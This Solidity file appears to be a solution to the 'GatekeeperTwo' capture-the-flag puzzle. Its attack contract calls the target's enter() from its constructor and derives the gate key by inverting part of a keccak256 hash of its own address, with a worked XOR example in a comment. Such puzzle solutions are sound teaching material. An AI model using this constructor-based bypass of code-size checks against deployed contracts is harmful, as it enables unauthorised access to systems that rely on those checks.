// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    constructor(address addr) {
        bytes8 operand = bytes8(keccak256(abi.encodePacked(address(this))));

        bytes8 gateKey = ~operand;

        GatekeeperTwo(addr).enter(gateKey);
    }

    /*
        For example, address(this) is:
        0x593092c91bCfEe1Bd73EFcf9729E049e70133154

        keccak256:
        0x8ec4bfd23b4329378599581b72fc02e47ad04199dde2003b2d79c565a3a40d1a

        bytes8:
        0x8ec4bfd23b432937
        binary
        1000 1110 1100 0100 1011 1111 1101 0010 0011 1011 0100 0011 0010 1001 0011 0111

        to get all Fs when XOR-ing, we need to have opposite bits:
        0111 0001 0011 1011 0100 0000 0010 1101 1100 0100 1011 1100 1101 0110 1100 1000
        hex
        0x713b402dc4bcd6c8 -----------> this is gate key
    */
}
